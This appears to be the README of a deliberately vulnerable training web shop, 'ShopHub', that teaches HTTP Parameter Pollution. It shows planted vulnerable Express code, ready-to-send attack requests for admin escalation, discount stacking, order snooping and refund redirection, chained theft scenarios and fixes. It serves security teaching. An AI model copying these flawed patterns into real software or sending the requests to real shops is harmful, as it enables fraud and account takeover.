# ShopHub - Vulnerable E-Commerce Platform

A full-featured e-commerce web application intentionally vulnerable to HTTP Parameter Pollution (HPP) attacks, demonstrating how reasonable-looking coding patterns can introduce HPP vulnerabilities. Each vulnerability appears legitimate but has subtle flaws that enable exploitation.

- Backend: Node.js with Express.js
- Session Management: express-session
- Data Storage: In-memory (resets on restart)
- Frontend: JavaScript, HTML, CSS

### Project Structure
```
shophub/
├── server.js                   # Main server with subtle vulnerabilities
├── utils/
│   └── helpers.js             # Server-side utilities (NOT exposed)
├── middleware/
│   └── auth.js                # Authentication middleware
├── public/                     # Static files (exposed to browser)
│   ├── js/
│   │   ├── checkout.js        # Checkout logic with debug info
│   │   ├── shop.js
│   │   ├── orders.js
│   │   ├── admin.js
│   │   ├── login.js
│   │   └── register.js
│   └── css/
│       └── style.css
├── views/                      # HTML templates
│   ├── index.html             # Landing page
│   ├── login.html             # Login page
│   ├── register.html          # Registration page
│   ├── shop.html              # Product listing
│   ├── checkout.html          # Checkout with engraving colors
│   ├── orders.html            # Order history & refunds
│   └── admin.html             # Admin dashboard
├── package.json                # Dependencies
├── products.json               # Product catalog
├── Dockerfile                  # Docker image configuration
├── docker-compose.yml          # Docker Compose setup
├── attack-demo.js             # Detailed vulnerability explanations
└── test-attacks.js            # Automated testing
```

---

## Installation

### Prerequisites
- Node.js 18+ (for npm method)
- Docker & Docker Compose (for Docker method)

### Method 1: NPM

```bash
npm install
npm start
```

### Method 2: Docker

```bash
docker-compose up
```

### Method 3: Docker Manual Build

```bash
docker build -t shophub-vulnerable .
docker run -d -p 3000:3000 --name shophub shophub-vulnerable
```

Access the application: http://localhost:3000

---

## System Features

### User Features
- User registration and authentication
- Product browsing with detailed information
- Shopping cart and checkout process
- Discount code system
- Product customization (engraving colors)
- Order history and tracking
- Refund request system
- Balance management

### Admin Features
- User management dashboard
- Order monitoring and management
- Bulk refund processing
- System-wide analytics

### Default Accounts

| Username | Password    | Role  | Balance  | Purpose                    |
|----------|-------------|-------|----------|----------------------------|
| alice    | password123 | User  | $1000.00 | Regular user (has orders)  |
| bob      | password456 | User  | $100.00  | Regular user (no orders)   |
| admin    | admin123    | Admin | $999999  | Administrator account      |

---

## Multi-Value Parameters

Not all array parameters are vulnerabilities. The system includes legitimate use cases for comparison.

### Engraving Colors (Legitimate)

**Purpose**: Allow users to select multiple engraving colors for product customization.

**Usage**:
```http
POST /checkout/process
Content-Type: application/x-www-form-urlencoded

product_id=1&engraving_colors=gold&engraving_colors=silver&engraving_colors=black
```

### HPP Vulnerabilities

The application contains 5 HTTP Parameter Pollution vulnerabilities that can be exploited individually or chained together. All vulnerabilities stem from subtle coding patterns that appear reasonable but have hidden flaws.

### 1. Privilege Escalation (Registration)

**Pattern**: Session storage bug with truthy check
- Code correctly converts `is_admin` string to boolean
- Developer stored the converted value in user database
- **BUT**: Accidentally stored raw value in session (copy-paste error)

**Vulnerable Code** (`server.js`):
```javascript
app.post('/api/register', (req, res) => {
    const { is_admin } = req.body;
    
    // Correct boolean conversion
    const isAdminFlag = is_admin === 'true';
    
    users[username] = {
        isAdmin: isAdminFlag,  // Stored correctly as false ✓
        // ...
    };
    
    // BUG: Storing raw value instead of converted boolean
    req.session.isAdmin = req.body.is_admin;  // Should use isAdminFlag!
});
```

**Vulnerable Code** (`middleware/auth.js`):
```javascript
function requireAdmin(req, res, next) {
    // BUG: Using truthy check instead of strict boolean
    // If session.isAdmin is array ['false', 'true'], this evaluates to true!
    if (!req.session.isAdmin) {
        return res.status(403).send('Access Denied');
    }
    next();
}
```

**Attack**:
```http
POST /api/register
Content-Type: application/x-www-form-urlencoded

username=attacker&password=hacked&email=attacker@evil.com&is_admin=false&is_admin=true
```

**What Happens**:
1. `req.body.is_admin` = `['false', 'true']` (Express parses as array)
2. `isAdminFlag = ['false', 'true'] === 'true'` → `false` ✓
3. User stored with `isAdmin: false` (correct)
4. Session stores `req.session.isAdmin = ['false', 'true']` (raw array)
5. `requireAdmin` checks `if (!['false', 'true'])` → false (arrays are truthy!)
6. **Result**: Attacker gains admin access

### 2. Discount Code Stacking (Checkout)

**Pattern**: Defensive programming with helper function
- Developer created `ensureArray()` helper for "consistent input handling"
- Looks like good defensive programming from Stack Overflow
- Applied it to normalize discount code input

**Vulnerable Code** (`utils/helpers.js`):
```javascript
function ensureArray(value) {
    if (!value) return [];
    // Common pattern: convert single value to array
    return [].concat(value).filter(Boolean);
}
```

**Vulnerable Code** (`server.js`):
```javascript
app.post('/checkout/process', requireLogin, (req, res) => {
    const { discount_code } = req.body;
    
    // Use helper to "normalize" input
    const discountCodes = ensureArray(discount_code);
    
    // Apply ALL discounts
    discountCodes.forEach(code => {
        if (code === 'SAVE10') total *= 0.9;
        if (code === 'SAVE20') total *= 0.8;
    });
});
```

**Attack**:
```http
POST /checkout/process
Content-Type: application/x-www-form-urlencoded

product_id=1&discount_code=SAVE10&discount_code=SAVE10&discount_code=SAVE20
```

**What Happens**:
1. `discount_code` = `['SAVE10', 'SAVE10', 'SAVE20']`
2. `ensureArray()` returns the array as-is
3. Loop applies: 10% off, then 10% off, then 20% off
4. $999.99 → $899.99 → $809.99 → $647.99
5. **Result**: 35% discount instead of maximum 20%

### 3. IDOR via HPP (Order Viewing)

**Pattern**: Middleware validates first value, route uses entire array
- Middleware written by one developer to validate access
- Route written by another developer months later
- Both look correct independently
- Classic "two developers, different times" scenario

**Vulnerable Code** (`middleware/auth.js`):
```javascript
function checkUserAccess(req, res, next) {
    const requestedUserId = req.query.user_id;
    
    // Take first value to check authorization
    const userIdToCheck = [].concat(requestedUserId)[0];
    
    if (parseInt(userIdToCheck) !== req.session.userId) {
        return res.status(403).json({ error: 'Access denied' });
    }
    next();
}
```

**Vulnerable Code** (`server.js`):
```javascript
app.get('/api/orders', checkUserAccess, async (req, res) => {
    const userId = req.query.user_id;
    
    // Simulate ORM behavior: if array, use IN clause
    if (Array.isArray(userId)) {
        const ids = userId.map(id => parseInt(id));
        userOrders = Object.values(orders).filter(o => ids.includes(o.userId));
    }
    
    res.json(userOrders);
});
```

**Attack**:
```http
GET /api/orders?user_id=2&user_id=1
```

**What Happens**:
1. Middleware checks `userId[0] = 2` (Bob's own ID) ✓
2. Authorization passes
3. Route uses entire array `[2, 1]`
4. Returns orders for both user 2 AND user 1
5. **Result**: Bob sees Alice's order history

### 4. Payment Redirect (Refund)

**Pattern**: Taking last value from array (ORM-like behavior)
- Developer thought: "normalize input by taking last value if multiple"
- Looks like handling edge cases
- Similar to ORM behavior in some frameworks

**Vulnerable Code**:
```javascript
app.post('/api/refund', requireLogin, async (req, res) => {
    const { refund_email } = req.body;
    
    // BUG: If array, take last value (looks like normalization)
    let emailToUse = refund_email;
    if (Array.isArray(refund_email)) {
        emailToUse = refund_email[refund_email.length - 1];
    }
    
    const recipient = Object.values(users).find(u => u.email === emailToUse);
    
    if (recipient) {
        recipient.balance += order.total;
    }
});
```

**Attack**:
```http
POST /api/refund
Content-Type: application/x-www-form-urlencoded

order_id=1000&refund_email=alice@example.com&refund_email=attacker@evil.com
```

**What Happens**:
1. `refund_email` = `['alice@example.com', 'attacker@evil.com']`
2. Code takes last value: `'attacker@evil.com'`
3. Finds attacker's account
4. Sends refund to attacker instead of Alice
5. **Result**: $564.99 stolen from Alice

**Real-world Parallel**: Similar to PayPal HPP (CVE-2009-4718)

### 5. Bulk Refund with Payment Redirect (Admin)

**Pattern**: Same as refund (copy-paste from another endpoint)
- Developer copy-pasted logic from single refund endpoint
- Added support for comma-separated strings (backward compatibility)
- Looks like good API design for multiple input formats

**Vulnerable Code**:
```javascript
app.post('/api/admin/bulk-refund', requireAdmin, (req, res) => {
    const { order_ids, recipient_email } = req.body;
    
    // Support both formats (backward compatibility)
    let orderIdList;
    if (typeof order_ids === 'string') {
        orderIdList = order_ids.split(',');
    } else {
        orderIdList = order_ids;
    }
    
    // BUG: Same normalization as single refund
    let emailToUse = recipient_email;
    if (Array.isArray(recipient_email)) {
        emailToUse = recipient_email[recipient_email.length - 1];
    }
    
    const recipient = Object.values(users).find(u => u.email === emailToUse);
    
    // All refunds go to same recipient!
    orderIdList.forEach(id => {
        recipient.balance += orders[id].total;
    });
});
```

**Attack**:
```http
POST /api/admin/bulk-refund
Content-Type: application/x-www-form-urlencoded

order_ids=1001,1002&recipient_email=customers@shop.com&recipient_email=attacker@evil.com
```

**What Happens**:
1. Attacker first gains admin access via Vulnerability #1
2. Uses bulk refund with polluted email
3. All refunds redirected to attacker
4. **Result**: Large-scale theft ($304.98+ per batch)

## Testing

### Automated Testing

All 5 vulnerabilities can be tested automatically:

```bash
node attacks.js
```

### Manual Testing via Browser

1. **Start the server**
   ```bash
   docker-compose up
   ```

2. **Test Discount Stacking**
   - Navigate to http://localhost:3000
   - Register/login as user
   - Go to checkout
   - Open browser DevTools → Network tab
   - Select a product and discount
   - Before submitting, edit request in DevTools
   - Add `&discount_code=SAVE10&discount_code=SAVE20` to form data
   - Submit and observe stacked discounts

3. **Test Privilege Escalation**
   - Go to registration page
   - Fill in the form
   - Open DevTools → Network tab
   - Submit the form
   - In DevTools, copy request as cURL
   - Modify to add: `&is_admin=false&is_admin=true`
   - Resend request
   - Login and verify admin access

---

## Attack Chain Examples

### Scenario 1: Normal User Exploitation

```
1. Bob discovers discount stacking while shopping
   → Saves $347 on laptop purchase

2. Bob explores and finds IDOR vulnerability
   → Views Alice's order history

3. Bob requests refund on Alice's order with email pollution
   → Steals Alice's $564.99 refund

Total Gain: $911.99
```

### Scenario 2: Privilege Escalation Path

```
1. Attacker registers with polluted is_admin parameter
   → Gains admin access immediately

2. Uses admin panel to view all orders
   → Identifies high-value refund targets

3. Uses bulk refund with email pollution
   → Steals $10,000+ from multiple victims

Total Gain: Full system control + $10,000+
```

---

## Security Lessons

### Root Causes

1. **Helper function misuse**: `ensureArray()` applied too broadly
2. **Code separation**: Middleware validates, route trusts (written by different people)
3. **Copy-paste errors**: Session storage bug, bulk refund copies refund logic
4. **Truthy checks**: `if (!isAdmin)` fails when `isAdmin` is array
5. **Array normalization**: Taking "last value" looks like edge case handling

### Prevention

**For Discount Stacking**:
```javascript
// Vulnerable
const codes = ensureArray(discount_code);
codes.forEach(code => applyDiscount(code));

// Fixed
if (Array.isArray(discount_code)) {
    return res.status(400).json({ 
        error: 'Only one discount code allowed' 
    });
}
const code = discount_code;
if (code) applyDiscount(code);
```

**For IDOR**:
```javascript
// Fixed: Use same value for both auth and data
const userId = Array.isArray(req.query.user_id) 
    ? parseInt(req.query.user_id[0]) 
    : parseInt(req.query.user_id);

if (userId !== req.session.userId) {
    return res.status(403).json({ error: 'Access denied' });
}
// Use the SAME userId variable for query
const userOrders = Object.values(orders).filter(o => o.userId === userId);
```

**For Privilege Escalation**:
```javascript
// Fixed: Use converted value in session
const isAdminFlag = is_admin === 'true';
req.session.isAdmin = isAdminFlag;  // Not req.body.is_admin!

// And use strict boolean check
if (req.session.isAdmin !== true) {
    return res.status(403).send('Access Denied');
}
```